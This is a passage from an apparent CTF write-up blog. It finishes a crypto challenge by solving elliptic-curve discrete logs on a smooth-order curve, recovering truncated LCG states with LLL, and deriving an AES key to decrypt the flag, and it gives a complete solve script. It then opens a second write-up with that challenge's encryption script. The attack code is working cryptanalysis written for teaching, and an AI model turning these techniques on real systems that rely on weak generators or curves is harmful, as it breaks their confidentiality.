    <span class="n">state</span> <span class="o">=</span> <span class="p">(</span><span class="mi">6364136223846793005</span><span class="o">*</span><span class="n">state</span> <span class="o">+</span> <span class="mi">1442695040888963407</span><span class="p">)</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">1</span><span class="o">&lt;&lt;</span><span class="mi">64</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span>
    <span class="k">return</span> <span class="n">state</span><span class="o">&gt;&gt;</span><span class="mi">32</span>
</code></pre></div></div>

<p>An LCG is a pseudo-random number generator which updates the state by multiplying, adding and then reducing modulo some number. We are given the LCG parameters, but the returned state is shifted by 32 bytes, giving us only half of the state. The LCG is iterated $1337$ times, before giving us three leaks:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">3</span><span class="p">):</span>
    <span class="n">P</span> <span class="o">=</span> <span class="n">LCG</span><span class="p">()</span><span class="o">*</span><span class="n">G</span>
    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"P</span><span class="si">{</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="si">}</span><span class="s"> = E(</span><span class="si">{</span><span class="n">P</span><span class="p">.</span><span class="n">x</span><span class="p">()</span><span class="si">}</span><span class="s">, </span><span class="si">{</span><span class="n">P</span><span class="p">.</span><span class="n">y</span><span class="p">()</span><span class="si">}</span><span class="s">)"</span><span class="p">)</span>
<span class="c1"># P1 = E(122037775221140048457289031201689495704, 122951420735275891082341998031602353733)
# P2 = E(184410941665585900129539390660771625087, 171416669794932710291436536477699627840)
# P3 = E(273827286896900834170681338812413416705, 75421249071279152991789476076300962651)
</span></code></pre></div></div>

<p>We have to use these points to recover the initial state of the LCG, which we can hash to recover the AES encryption key and decrypt the flag.</p>

<h5 id="implementing-the-solution">Implementing the solution</h5>

<p>Like previously mentioned, the smooth order of the elliptic curve means that the discrete logarithm problem is easy to solve with a subgroup attack. We begin by defining our known values:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">p</span> <span class="o">=</span> <span class="mi">289938057806527723758225206013420438469</span> 
<span class="n">a</span> <span class="o">=</span> <span class="mi">131472054804376335219486973894036812363</span> 
<span class="n">b</span> <span class="o">=</span> <span class="mi">168821582640259041697285427337782028716</span>
<span class="n">E</span> <span class="o">=</span> <span class="n">EllipticCurve</span><span class="p">(</span><span class="n">GF</span><span class="p">(</span><span class="n">p</span><span class="p">),</span> <span class="p">[</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">])</span>
<span class="n">G</span> <span class="o">=</span> <span class="n">E</span><span class="p">.</span><span class="n">gen</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="n">factors</span> <span class="o">=</span> <span class="p">[</span><span class="mi">11</span><span class="p">,</span> <span class="mi">117101</span><span class="p">,</span> <span class="mi">457517</span><span class="p">,</span> <span class="mi">682657</span><span class="p">,</span> <span class="mi">1814651</span><span class="p">,</span> <span class="mi">6542287</span><span class="p">,</span> <span class="mi">60704299</span><span class="p">]</span> <span class="c1"># factor(E.order())
</span>
<span class="n">P1</span> <span class="o">=</span> <span class="n">E</span><span class="p">(</span><span class="mi">122037775221140048457289031201689495704</span><span class="p">,</span> <span class="mi">122951420735275891082341998031602353733</span><span class="p">)</span>
<span class="n">P2</span> <span class="o">=</span> <span class="n">E</span><span class="p">(</span><span class="mi">184410941665585900129539390660771625087</span><span class="p">,</span> <span class="mi">171416669794932710291436536477699627840</span><span class="p">)</span>
<span class="n">P3</span> <span class="o">=</span> <span class="n">E</span><span class="p">(</span><span class="mi">273827286896900834170681338812413416705</span><span class="p">,</span> <span class="mi">75421249071279152991789476076300962651</span><span class="p">)</span>
</code></pre></div></div>

<p>The subgroup attack works by solving the discrete log for each individual factor, then combining the results with the Chinese Remainder Theorem.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">bsgs</span><span class="p">(</span><span class="n">Q</span><span class="p">,</span> <span class="n">P</span><span class="p">,</span> <span class="n">primes</span><span class="p">):</span>
    <span class="n">dlogs</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="k">for</span> <span class="n">fac</span> <span class="ow">in</span> <span class="n">primes</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[+] Iteration for </span><span class="si">{</span><span class="n">fac</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
        <span class="n">t</span> <span class="o">=</span> <span class="n">P</span><span class="p">.</span><span class="n">order</span><span class="p">()</span> <span class="o">//</span> <span class="n">fac</span>
        <span class="n">dlog</span> <span class="o">=</span> <span class="n">discrete_log</span><span class="p">(</span><span class="n">t</span> <span class="o">*</span> <span class="n">Q</span><span class="p">,</span> <span class="n">t</span> <span class="o">*</span> <span class="n">P</span><span class="p">,</span> <span class="n">operation</span><span class="o">=</span><span class="s">"+"</span><span class="p">)</span>
        <span class="n">dlogs</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">dlog</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">crt</span><span class="p">(</span><span class="n">dlogs</span><span class="p">,</span> <span class="n">primes</span><span class="p">)</span>
</code></pre></div></div>

<p>By running this function on each $P_{1},P_{2},P_{3}$ and the curve’s generator point $G$, we can recover the three outputs of the <code class="language-plaintext highlighter-rouge">LCG()</code> function:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">truncated_states</span> <span class="o">=</span> <span class="p">[</span><span class="n">bsgs</span><span class="p">(</span><span class="n">P</span><span class="p">,</span> <span class="n">G</span><span class="p">,</span> <span class="n">factors</span><span class="p">)</span> <span class="k">for</span> <span class="n">P</span> <span class="ow">in</span> <span class="p">[</span><span class="n">P1</span><span class="p">,</span><span class="n">P2</span><span class="p">,</span><span class="n">P3</span><span class="p">]]</span>
<span class="c1"># [1939624097, 3628133847, 3055123311]
</span></code></pre></div></div>

<p>These bit shifted states, or rather <code class="language-plaintext highlighter-rouge">truncated</code> states, can actually be used along with the LCG parameters to recover the complete states. Implementations for a <code class="language-plaintext highlighter-rouge">truncated state recovery attack</code> exist online, for example in https://github.com/jvdsn/crypto-attacks/blob/master/attacks/lcg/truncated_state_recovery.py. The details of this attack can be a bit complicated, but using the function is quite plug-and-play.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># https://github.com/jvdsn/crypto-attacks/blob/master/attacks/lcg/truncated_state_recovery.py
</span><span class="k">def</span> <span class="nf">truncated_lcg_attack</span><span class="p">(</span><span class="n">y</span><span class="p">,</span> <span class="n">k</span><span class="p">,</span> <span class="n">s</span><span class="p">,</span> <span class="n">m</span><span class="p">,</span> <span class="n">a</span><span class="p">,</span> <span class="n">c</span><span class="p">):</span>
    <span class="n">diff_bit_length</span> <span class="o">=</span> <span class="n">k</span> <span class="o">-</span> <span class="n">s</span>

    <span class="n">delta</span> <span class="o">=</span> <span class="n">c</span> <span class="o">%</span> <span class="n">m</span>
    <span class="n">y</span> <span class="o">=</span> <span class="n">vector</span><span class="p">(</span><span class="n">ZZ</span><span class="p">,</span> <span class="n">y</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">y</span><span class="p">)):</span>
        <span class="n">y</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">y</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="n">diff_bit_length</span><span class="p">)</span> <span class="o">-</span> <span class="n">delta</span>
        <span class="n">delta</span> <span class="o">=</span> <span class="p">(</span><span class="n">a</span> <span class="o">*</span> <span class="n">delta</span> <span class="o">+</span> <span class="n">c</span><span class="p">)</span> <span class="o">%</span> <span class="n">m</span>

    <span class="n">B</span> <span class="o">=</span> <span class="n">matrix</span><span class="p">(</span><span class="n">ZZ</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">y</span><span class="p">),</span> <span class="nb">len</span><span class="p">(</span><span class="n">y</span><span class="p">))</span>
    <span class="n">B</span><span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">m</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">y</span><span class="p">)):</span>
        <span class="n">B</span><span class="p">[</span><span class="n">i</span><span class="p">,</span> <span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">a</span> <span class="o">**</span> <span class="n">i</span>
        <span class="n">B</span><span class="p">[</span><span class="n">i</span><span class="p">,</span> <span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span>

    <span class="n">B</span> <span class="o">=</span> <span class="n">B</span><span class="p">.</span><span class="n">LLL</span><span class="p">()</span>

    <span class="n">b</span> <span class="o">=</span> <span class="n">B</span> <span class="o">*</span> <span class="n">y</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">b</span><span class="p">)):</span>
        <span class="n">b</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="nb">round</span><span class="p">(</span><span class="n">QQ</span><span class="p">(</span><span class="n">b</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">/</span> <span class="n">m</span><span class="p">)</span> <span class="o">*</span> <span class="n">m</span> <span class="o">-</span> <span class="n">b</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>

    <span class="n">delta</span> <span class="o">=</span> <span class="n">c</span> <span class="o">%</span> <span class="n">m</span>
    <span class="n">x</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">B</span><span class="p">.</span><span class="n">solve_right</span><span class="p">(</span><span class="n">b</span><span class="p">))</span>
    <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">state</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
        <span class="n">x</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">y</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="n">state</span> <span class="o">+</span> <span class="n">delta</span><span class="p">)</span>
        <span class="n">delta</span> <span class="o">=</span> <span class="p">(</span><span class="n">a</span> <span class="o">*</span> <span class="n">delta</span> <span class="o">+</span> <span class="n">c</span><span class="p">)</span> <span class="o">%</span> <span class="n">m</span>

    <span class="k">return</span> <span class="n">x</span>

<span class="n">states</span> <span class="o">=</span> <span class="n">truncated_lcg_attack</span><span class="p">(</span><span class="n">truncated_states</span><span class="p">,</span> <span class="mi">64</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="mi">2</span><span class="o">**</span><span class="mi">64</span><span class="p">,</span> <span class="mi">6364136223846793005</span><span class="p">,</span> <span class="mi">1442695040888963407</span><span class="p">)</span>
<span class="c1"># [8330622065471768203, 15582716220711197886, 13121654707256889525]
</span></code></pre></div></div>

<p>With the full states recovered, we can construct a function to perform the inverse steps of the LCG. The encryption script performed $1337$ iterations, then $3$ more for the elliptic curve points. We can pick the first recovered state and step back 1338 iterations:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">M</span> <span class="o">=</span> <span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">64</span>
<span class="n">A</span>  <span class="o">=</span> <span class="mi">6364136223846793005</span>
<span class="n">C</span>  <span class="o">=</span> <span class="mi">1442695040888963407</span>
<span class="n">Ainv</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">A</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">M</span><span class="p">)</span>

<span class="n">state</span> <span class="o">=</span> <span class="n">states</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">%</span><span class="n">M</span>
<span class="k">def</span> <span class="nf">inverse_LCG</span><span class="p">():</span>
    <span class="k">global</span> <span class="n">state</span>
    <span class="n">state</span> <span class="o">=</span> <span class="p">(</span><span class="n">Ainv</span> <span class="o">*</span> <span class="p">(</span><span class="n">state</span> <span class="o">-</span> <span class="n">C</span><span class="p">))</span> <span class="o">%</span> <span class="n">M</span>
    <span class="k">return</span> <span class="n">state</span>

<span class="n">state0</span> <span class="o">=</span> <span class="p">[</span><span class="n">inverse_LCG</span><span class="p">()</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1338</span><span class="p">)][</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
</code></pre></div></div>

<p>Finally, we can hash <code class="language-plaintext highlighter-rouge">state0</code> to get the AES-CBC encryption key, and decrypt the flag:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">key</span> <span class="o">=</span> <span class="n">hashlib</span><span class="p">.</span><span class="n">sha256</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">state0</span><span class="p">).</span><span class="n">encode</span><span class="p">()).</span><span class="n">digest</span><span class="p">()</span>
<span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="p">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">AES</span><span class="p">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="nb">bytes</span><span class="p">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">iv</span><span class="p">))</span>
<span class="n">pt</span> <span class="o">=</span> <span class="n">unpad</span><span class="p">(</span><span class="n">cipher</span><span class="p">.</span><span class="n">decrypt</span><span class="p">(</span><span class="nb">bytes</span><span class="p">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">ct</span><span class="p">)),</span><span class="mi">16</span><span class="p">).</span><span class="n">decode</span><span class="p">()</span>
<span class="k">print</span><span class="p">(</span><span class="n">pt</span><span class="p">)</span>
<span class="c1"># DREAM{E_1n_LCG_st4nd5_4_Ell1pt1c_Curv3s}
</span></code></pre></div></div>

<h5 id="solvesage">solve.sage</h5>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">os</span><span class="p">,</span> <span class="n">hashlib</span>
<span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>
<span class="kn">from</span> <span class="nn">Crypto.Util.Padding</span> <span class="kn">import</span> <span class="n">unpad</span>

<span class="n">p</span> <span class="o">=</span> <span class="mi">289938057806527723758225206013420438469</span> 
<span class="n">a</span> <span class="o">=</span> <span class="mi">131472054804376335219486973894036812363</span> 
<span class="n">b</span> <span class="o">=</span> <span class="mi">168821582640259041697285427337782028716</span>
<span class="n">E</span> <span class="o">=</span> <span class="n">EllipticCurve</span><span class="p">(</span><span class="n">GF</span><span class="p">(</span><span class="n">p</span><span class="p">),</span> <span class="p">[</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">])</span>
<span class="n">G</span> <span class="o">=</span> <span class="n">E</span><span class="p">.</span><span class="n">gen</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="n">factors</span> <span class="o">=</span> <span class="p">[</span><span class="mi">11</span><span class="p">,</span> <span class="mi">117101</span><span class="p">,</span> <span class="mi">457517</span><span class="p">,</span> <span class="mi">682657</span><span class="p">,</span> <span class="mi">1814651</span><span class="p">,</span> <span class="mi">6542287</span><span class="p">,</span> <span class="mi">60704299</span><span class="p">]</span> <span class="c1"># factor(E.order())
</span>
<span class="n">P1</span> <span class="o">=</span> <span class="n">E</span><span class="p">(</span><span class="mi">122037775221140048457289031201689495704</span><span class="p">,</span> <span class="mi">122951420735275891082341998031602353733</span><span class="p">)</span>
<span class="n">P2</span> <span class="o">=</span> <span class="n">E</span><span class="p">(</span><span class="mi">184410941665585900129539390660771625087</span><span class="p">,</span> <span class="mi">171416669794932710291436536477699627840</span><span class="p">)</span>
<span class="n">P3</span> <span class="o">=</span> <span class="n">E</span><span class="p">(</span><span class="mi">273827286896900834170681338812413416705</span><span class="p">,</span> <span class="mi">75421249071279152991789476076300962651</span><span class="p">)</span>
<span class="n">iv</span> <span class="o">=</span> <span class="s">'3d7c4da2defd1b78a0feccbb553dd4da'</span>
<span class="n">ct</span> <span class="o">=</span> <span class="s">'081393130914bdd8c625786160f8de0dfd0dd5a4f3c2ca946b803cfe565082849827c9c0794db358ee81bc734f0fb361'</span>

<span class="k">def</span> <span class="nf">bsgs</span><span class="p">(</span><span class="n">Q</span><span class="p">,</span> <span class="n">P</span><span class="p">,</span> <span class="n">primes</span><span class="p">):</span>
    <span class="n">dlogs</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="k">for</span> <span class="n">fac</span> <span class="ow">in</span> <span class="n">primes</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[+] Iteration for </span><span class="si">{</span><span class="n">fac</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
        <span class="n">t</span> <span class="o">=</span> <span class="n">P</span><span class="p">.</span><span class="n">order</span><span class="p">()</span> <span class="o">//</span> <span class="n">fac</span>
        <span class="n">dlog</span> <span class="o">=</span> <span class="n">discrete_log</span><span class="p">(</span><span class="n">t</span> <span class="o">*</span> <span class="n">Q</span><span class="p">,</span> <span class="n">t</span> <span class="o">*</span> <span class="n">P</span><span class="p">,</span> <span class="n">operation</span><span class="o">=</span><span class="s">"+"</span><span class="p">)</span>
        <span class="n">dlogs</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">dlog</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">crt</span><span class="p">(</span><span class="n">dlogs</span><span class="p">,</span> <span class="n">primes</span><span class="p">)</span>

<span class="n">truncated_states</span> <span class="o">=</span> <span class="p">[</span><span class="n">bsgs</span><span class="p">(</span><span class="n">P</span><span class="p">,</span> <span class="n">G</span><span class="p">,</span> <span class="n">factors</span><span class="p">)</span> <span class="k">for</span> <span class="n">P</span> <span class="ow">in</span> <span class="p">[</span><span class="n">P1</span><span class="p">,</span><span class="n">P2</span><span class="p">,</span><span class="n">P3</span><span class="p">]]</span>

<span class="c1"># https://github.com/jvdsn/crypto-attacks/blob/master/attacks/lcg/truncated_state_recovery.py
</span><span class="k">def</span> <span class="nf">truncated_lcg_attack</span><span class="p">(</span><span class="n">y</span><span class="p">,</span> <span class="n">k</span><span class="p">,</span> <span class="n">s</span><span class="p">,</span> <span class="n">m</span><span class="p">,</span> <span class="n">a</span><span class="p">,</span> <span class="n">c</span><span class="p">):</span>
    <span class="n">diff_bit_length</span> <span class="o">=</span> <span class="n">k</span> <span class="o">-</span> <span class="n">s</span>

    <span class="n">delta</span> <span class="o">=</span> <span class="n">c</span> <span class="o">%</span> <span class="n">m</span>
    <span class="n">y</span> <span class="o">=</span> <span class="n">vector</span><span class="p">(</span><span class="n">ZZ</span><span class="p">,</span> <span class="n">y</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">y</span><span class="p">)):</span>
        <span class="n">y</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">y</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="n">diff_bit_length</span><span class="p">)</span> <span class="o">-</span> <span class="n">delta</span>
        <span class="n">delta</span> <span class="o">=</span> <span class="p">(</span><span class="n">a</span> <span class="o">*</span> <span class="n">delta</span> <span class="o">+</span> <span class="n">c</span><span class="p">)</span> <span class="o">%</span> <span class="n">m</span>

    <span class="n">B</span> <span class="o">=</span> <span class="n">matrix</span><span class="p">(</span><span class="n">ZZ</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">y</span><span class="p">),</span> <span class="nb">len</span><span class="p">(</span><span class="n">y</span><span class="p">))</span>
    <span class="n">B</span><span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">m</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">y</span><span class="p">)):</span>
        <span class="n">B</span><span class="p">[</span><span class="n">i</span><span class="p">,</span> <span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">a</span> <span class="o">**</span> <span class="n">i</span>
        <span class="n">B</span><span class="p">[</span><span class="n">i</span><span class="p">,</span> <span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span>

    <span class="n">B</span> <span class="o">=</span> <span class="n">B</span><span class="p">.</span><span class="n">LLL</span><span class="p">()</span>

    <span class="n">b</span> <span class="o">=</span> <span class="n">B</span> <span class="o">*</span> <span class="n">y</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">b</span><span class="p">)):</span>
        <span class="n">b</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="nb">round</span><span class="p">(</span><span class="n">QQ</span><span class="p">(</span><span class="n">b</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">/</span> <span class="n">m</span><span class="p">)</span> <span class="o">*</span> <span class="n">m</span> <span class="o">-</span> <span class="n">b</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>

    <span class="n">delta</span> <span class="o">=</span> <span class="n">c</span> <span class="o">%</span> <span class="n">m</span>
    <span class="n">x</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">B</span><span class="p">.</span><span class="n">solve_right</span><span class="p">(</span><span class="n">b</span><span class="p">))</span>
    <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">state</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
        <span class="n">x</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">y</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="n">state</span> <span class="o">+</span> <span class="n">delta</span><span class="p">)</span>
        <span class="n">delta</span> <span class="o">=</span> <span class="p">(</span><span class="n">a</span> <span class="o">*</span> <span class="n">delta</span> <span class="o">+</span> <span class="n">c</span><span class="p">)</span> <span class="o">%</span> <span class="n">m</span>

    <span class="k">return</span> <span class="n">x</span>

<span class="n">states</span> <span class="o">=</span> <span class="n">truncated_lcg_attack</span><span class="p">(</span><span class="n">truncated_states</span><span class="p">,</span> <span class="mi">64</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="mi">2</span><span class="o">**</span><span class="mi">64</span><span class="p">,</span> <span class="mi">6364136223846793005</span><span class="p">,</span> <span class="mi">1442695040888963407</span><span class="p">)</span>

<span class="n">M</span> <span class="o">=</span> <span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">64</span>
<span class="n">A</span>  <span class="o">=</span> <span class="mi">6364136223846793005</span>
<span class="n">C</span>  <span class="o">=</span> <span class="mi">1442695040888963407</span>
<span class="n">Ainv</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">A</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">M</span><span class="p">)</span>

<span class="n">state</span> <span class="o">=</span> <span class="n">states</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">%</span><span class="n">M</span>
<span class="k">def</span> <span class="nf">inverse_LCG</span><span class="p">():</span>
    <span class="k">global</span> <span class="n">state</span>
    <span class="n">state</span> <span class="o">=</span> <span class="p">(</span><span class="n">Ainv</span> <span class="o">*</span> <span class="p">(</span><span class="n">state</span> <span class="o">-</span> <span class="n">C</span><span class="p">))</span> <span class="o">%</span> <span class="n">M</span>
    <span class="k">return</span> <span class="n">state</span>

<span class="n">state0</span> <span class="o">=</span> <span class="p">[</span><span class="n">inverse_LCG</span><span class="p">()</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1338</span><span class="p">)][</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
<span class="n">key</span> <span class="o">=</span> <span class="n">hashlib</span><span class="p">.</span><span class="n">sha256</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">state0</span><span class="p">).</span><span class="n">encode</span><span class="p">()).</span><span class="n">digest</span><span class="p">()</span>
<span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="p">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">AES</span><span class="p">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="nb">bytes</span><span class="p">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">iv</span><span class="p">))</span>
<span class="n">pt</span> <span class="o">=</span> <span class="n">unpad</span><span class="p">(</span><span class="n">cipher</span><span class="p">.</span><span class="n">decrypt</span><span class="p">(</span><span class="nb">bytes</span><span class="p">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">ct</span><span class="p">)),</span><span class="mi">16</span><span class="p">).</span><span class="n">decode</span><span class="p">()</span>
<span class="k">print</span><span class="p">(</span><span class="n">pt</span><span class="p">)</span>
</code></pre></div></div>]]></content><author><name>Zukane</name></author><category term="writeups" /><category term="Elliptic Curve" /><category term="LCG" /><category term="Truncated attack" /><summary type="html"><![CDATA[Challenge Overview]]></summary></entry><entry><title type="html">mvm sum problem (DREAM 2025)</title><link href="https://zukane.github.io/mvm-sum-problem/" rel="alternate" type="text/html" title="mvm sum problem (DREAM 2025)" /><published>2025-08-09T13:00:00+02:00</published><updated>2025-08-09T13:00:00+02:00</updated><id>https://zukane.github.io/mvm-sum-problem</id><content type="html" xml:base="https://zukane.github.io/mvm-sum-problem/"><![CDATA[<h5 id="challenge-overview">Challenge overview</h5>

<p>In this CTF challenge, we are given the following encryption script:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="n">getPrime</span><span class="p">,</span> <span class="n">bytes_to_long</span><span class="p">,</span> <span class="n">long_to_bytes</span>
<span class="kn">import</span> <span class="nn">secrets</span><span class="p">,</span> <span class="n">os</span><span class="p">,</span> <span class="n">hashlib</span>
<span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>
<span class="kn">from</span> <span class="nn">Crypto.Util.Padding</span> <span class="kn">import</span> <span class="n">pad</span>

<span class="n">flag</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"DREAM{???????????????????????????????????????????????????????????????}"</span>

<span class="n">n</span> <span class="o">=</span> <span class="mi">64</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">getPrime</span><span class="p">(</span><span class="mi">2</span><span class="o">*</span><span class="n">n</span><span class="p">)</span>
<span class="n">A</span> <span class="o">=</span> <span class="p">[[</span><span class="n">secrets</span><span class="p">.</span><span class="n">randbits</span><span class="p">(</span><span class="mi">2</span><span class="o">*</span><span class="n">n</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">n</span><span class="p">)]</span> <span class="k">for</span> <span class="n">__</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">n</span><span class="p">)]</span>
<span class="n">s</span> <span class="o">=</span> <span class="p">[</span><span class="n">secrets</span><span class="p">.</span><span class="n">randbits</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">n</span><span class="p">)]</span>
<span class="n">x</span> <span class="o">=</span> <span class="p">[</span><span class="nb">sum</span><span class="p">(</span><span class="n">ai</span><span class="o">*</span><span class="n">si</span> <span class="k">for</span> <span class="n">ai</span><span class="p">,</span> <span class="n">si</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">row</span><span class="p">,</span> <span class="n">s</span><span class="p">))</span> <span class="k">for</span> <span class="n">row</span> <span class="ow">in</span> <span class="n">A</span><span class="p">]</span>
<span class="n">b</span> <span class="o">=</span> <span class="p">[</span><span class="n">xi</span> <span class="o">%</span> <span class="n">p</span> <span class="k">for</span> <span class="n">xi</span> <span class="ow">in</span> <span class="n">x</span><span class="p">]</span>
<span class="n">t</span> <span class="o">=</span> <span class="p">[</span><span class="n">xi</span> <span class="o">&gt;&gt;</span> <span class="mi">48</span> <span class="k">for</span> <span class="n">xi</span> <span class="ow">in</span> <span class="n">x</span><span class="p">]</span>
<span class="n">A_mod</span> <span class="o">=</span> <span class="p">[[</span><span class="n">ai</span> <span class="o">%</span> <span class="n">p</span> <span class="k">for</span> <span class="n">ai</span> <span class="ow">in</span> <span class="n">a</span><span class="p">]</span> <span class="k">for</span> <span class="n">a</span> <span class="ow">in</span> <span class="n">A</span><span class="p">]</span>

